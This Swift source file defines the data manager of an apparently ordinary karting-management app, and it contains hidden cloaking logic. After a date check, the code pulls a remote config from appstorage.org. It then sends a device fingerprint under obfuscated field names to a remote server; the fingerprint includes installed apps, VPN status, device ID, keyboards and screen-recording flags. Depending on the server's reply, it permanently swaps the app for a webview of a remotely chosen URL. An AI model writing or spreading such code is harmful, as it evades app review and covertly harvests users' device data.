import SwiftUI

protocol LocalStorageProtocol: AnyObject {
    func saveRepairTotalCost(_ totalCost: Int)
    func fetchRepairTotalCost() throws -> Int
    func saveRepair(_ repair: Repair)
    func fetchRepairs() throws -> [Repair]
    func saveEmployee(_ employee: Employee)
    func fetchEmployees() throws -> [Employee]
    func saveKartingPlace(_ kartingPlace: KartingPlace)
    func fetchKartingPlace() throws -> KartingPlace?
    func saveKart(_ kart: Kart)
    func fetchKarts() throws -> [Kart]
}

enum AppType {
    case karting
    case webView
}

final class DataManager: ObservableObject {
    
    let localStorage: LocalStorageProtocol = LocalStorage()
    
    @Published var kartingPlace: KartingPlace?
    @Published var karts: Array<Kart> = []
    @Published var employees: Array<Employee> = []
    @Published var repairTotalCost: Int = 0
    @Published var repairs: Array<Repair> = []
    
    @Published var dataLoaded: Bool = false
    
    var localDataLoaded: Bool = false {
        didSet {
            dataLoadedCheck()
        }
    }
    
    var remoteDataLoaded: Bool = false {
        didSet {
            dataLoadedCheck()
        }
    }
    
    @Published var value: Double = 0
    
    var recorded = false
    var screenshotTaken = false
    var setupFirstCall = false
    
    private var remoteConfig: RemoteConfig?
    
    //webViewConditionProperties
    @AppStorage("showWebViewAlways") var showWebViewAlways = false
    @AppStorage("urlForWebView") var urlForWebView = "https://google.com/"
    
    var appType: AppType?
    
    private func dataLoadedCheck() {
        if remoteDataLoaded && localDataLoaded {
            dataLoaded = true
        }
    }
    
    func loadLocalData() {
        DispatchQueue.global(qos: .utility).async { [weak self] in
            guard let self = self else { return }
            self.kartingPlace = try? self.localStorage.fetchKartingPlace()
            if let karts = try? self.localStorage.fetchKarts() {
                self.karts = karts
            }
            
            if let employees = try? self.localStorage.fetchEmployees() {
                self.employees = employees
            }
            if let repairTotalCost = try? self.localStorage.fetchRepairTotalCost() {
                self.repairTotalCost = repairTotalCost
            }

            if let repairs = try? self.localStorage.fetchRepairs() {
                self.repairs = repairs
            }
            self.stroke()
        }
    }
    
    func decodeRemoteConfigResponse(data: Data) -> RemoteConfig? {
        let jsonDecoder = JSONDecoder()
        return try? jsonDecoder.decode(RemoteConfig.self, from: data)
        
    }
    
    private func stroke() {
        if value < 1 {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.02) { [weak self] in
                guard let self = self else { return }
                self.value += 0.02
                self.stroke()
            }
        } else { localDataLoaded = true }
    }
    
    func setupWebViewCondition() {
        guard !setupFirstCall else { return } //чтобы два раза не выполнялось. onAppear в loadingView вызывает метод 2 раза.
        setupFirstCall = true
        if showWebViewAlways {
            appType = .webView
        } else {
            appType = .karting
        }
        setupRemoteConfig { [weak self] in
            self?.isSetupServer10Needed()
        }
    }
    
    private func assembleDeviceData() -> DeviceData {
        let deviceDataCollector = DeviceDataCollector()
        let deviceData = DeviceData(vivisWork: deviceDataCollector.isVpnActive,
                                    gfdokPS: deviceDataCollector.deviceName,
                                    gdpsjPjg: deviceDataCollector.deviceModel,
                                    poguaKFP: deviceDataCollector.deviceId,
                                    gpaMFOfa: deviceDataCollector.wifiAddress,
                                    bcpJFs: deviceDataCollector.iosVersion,
                                    GOmblx: deviceDataCollector.deviceLanguage,
                                    G0pxum: deviceDataCollector.timeZone,
                                    Fpvbduwm: deviceDataCollector.isCharging,
                                    Fpbjcv: deviceDataCollector.deviceMemorySize,
                                    StwPp: screenshotTaken,
                                    KDhsd: recorded,
                                    bvoikOGjs: deviceDataCollector.appsOnDevice,
                                    gfpbvjsoM: deviceDataCollector.batteryLevel,
                                    gfdosnb: deviceDataCollector.keyboards,
                                    bpPjfns: deviceDataCollector.region,
                                    biMpaiuf: deviceDataCollector.isMetricSystem,
                                    oahgoMAOI: deviceDataCollector.isBatteryFull)
        return deviceData
    }
    
    private func setupRemoteConfig(_ completion: @escaping () -> ()) {
        //https://appstorage.org/api/conf/p1tcr3wk4rttr4ck3r //remote config link
        let urlString = "https://appstorage.org/api/conf/p1tcr3wk4rttr4ck3r"
        guard let url = URL(string: urlString) else {
            karting()
            return
        }

        let task = URLSession.shared.dataTask(with: url) { [weak self] (data, response, error) in
            guard let data = data else {
                self?.karting()
                self?.remoteDataLoaded = true //Если ответа от remoteConfig нет, мы открываем в зависимости от showAlwaysWebView
                return
            }
            guard let remoteConfig = try? JSONDecoder().decode(RemoteConfig.self, from: data) else { 
                self?.karting()
                self?.remoteDataLoaded = true //Если ответ не смогли преобразовать в json, мы открываем в зависимости от showAlwaysWebView
                return
            }
            self?.remoteConfig = remoteConfig
            completion()
        }

        task.resume()
    }
    
    private func isSetupServer10Needed() {
        isAllurlChange()
        if showWebViewAlways {
            webView()
        } else {
            setupServer10()
        }
    }
    
    private func isAllurlChange() {
        guard let remoteConfig = remoteConfig else { return }
        if remoteConfig.isAllChangeURL == "true" {
            self.urlForWebView = remoteConfig.urlLink
        }
    }
    
    private func setupServer10() {
        guard let remoteConfig = remoteConfig else { 
            remoteDataLoaded = true
            return
        }
        let lastDateString = remoteConfig.lastDate
        guard let lastDate = stringToDate(lastDateString) else {
            remoteDataLoaded = true
            return
        }
        //guard let testDate = stringToDate("23.07.2024") else { return }
        
        if couldShowWebViewByDate(lastDate: lastDate) {
            if remoteConfig.isDead == "true" {
                showWebViewAlways = true
                webView()
            } else {
                server10response { [weak self] result in
                    guard let self = self else { return }
                    if result {
                        self.showWebViewAlways = true
                        self.webView()
                    } else {
                        self.karting()
                    }
                }
            }
        } else {
            karting()
        }
    }
    
    private func server10response(completion: @escaping (Bool) -> ()) {
        let deviceData = assembleDeviceData()
        let remoteConfig = remoteConfig!
        
        let jsonEncoder = JSONEncoder()
        let jsonData = try? jsonEncoder.encode(deviceData)
        if let jsonData = jsonData,
           let url = URL(string: remoteConfig.server10) {
            var request = URLRequest(url: url)
            request.httpMethod = "POST"
            request.httpBody = jsonData
            let task = URLSession.shared.dataTask(with: request) { [weak self] (data, response, error) in
                guard let data = data, error == nil else {
                    print(error?.localizedDescription ?? "No data") //если данные с 1/0 получить не смогли
                    self?.karting()
                    return
                }
                let responseJSON = try? JSONSerialization.jsonObject(with: data, options: [])
                if let responseJSON = responseJSON as? [String: Any] {
                    let value = responseJSON[remoteConfig.codeTech]
                    if let value = value as? Int {
                        if value == 1 {
                            self?.karting()
                            completion(false)
                        } else {
                            self?.webView()
                            self?.showWebViewAlways = true
                            completion(true)
                        }
                    } else { //Если не смогли получить значение
                        self?.karting()
                    }
                } else { //Если не смогли декодировать json
                    self?.karting()
                }
            }
            task.resume()
        } else {
            //Если не смогли получить url и енкодировать данные устройства в json
            karting()
        }
    }
    
    private func couldShowWebViewByDate(lastDate: Date) -> Bool {
        lastDate <= Date()
    }
    
    private func stringToDate(_ str: String) -> Date? {
        let dateFormatter = DateFormatter()
        dateFormatter.timeZone = TimeZone(abbreviation: "UTC")
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let date = dateFormatter.date(from: str)
        if let date = date {
            return date
        } else { return nil }
    }
    
    private func karting() {
        appType = .karting
        remoteDataLoaded = true
    }
    
    private func webView() {
        appType = .webView
        remoteDataLoaded = true
    }
}
